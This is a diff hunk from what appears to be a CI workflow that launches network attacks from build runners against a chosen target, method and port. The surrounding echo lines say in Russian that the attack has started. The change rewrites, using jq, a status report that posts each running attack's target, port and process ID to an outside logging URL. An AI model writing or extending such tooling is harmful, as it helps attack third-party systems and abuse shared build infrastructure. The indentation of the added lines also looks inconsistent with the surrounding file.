@@ -136,18 +136,31 @@ jobs:
               echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
             fi
 
-            if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
-              LOG_DATA='{
-  "runner": "'$RUNNER_ID'",
-  "method": "'$METHOD'",
-  "target": "'$TARGET'",
-  "port": "'$PORT'",
-  "status": "running",
-  "pid": '$CURRENT_PID',
-  "timestamp": "'$(date -u +%s)'"
-}'
-              curl -s -X POST -H "Content-Type: application/json" -d "$LOG_DATA" "$LOG_URL" || true
-            fi
+          if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
+            LOG_DATA=$(jq -n \
+              --arg runner "$RUNNER_ID" \
+              --arg method "$METHOD" \
+              --arg target "$TARGET" \
+              --arg port "$PORT" \
+              --arg status "running" \
+              --arg timestamp "$(date -u +%s)" \
+              --argjson pid "$CURRENT_PID" \
+              '{
+                runner: $runner,
+                method: $method,
+                target: $target,
+                port: $port,
+                status: $status,
+                pid: $pid,
+                timestamp: $timestamp
+              }'
+            )
+          
+            curl -s -X POST \
+              -H "Content-Type: application/json" \
+              -d "$LOG_DATA" \
+              "$LOG_URL" || true
+          fi
 
             sleep 2
           done
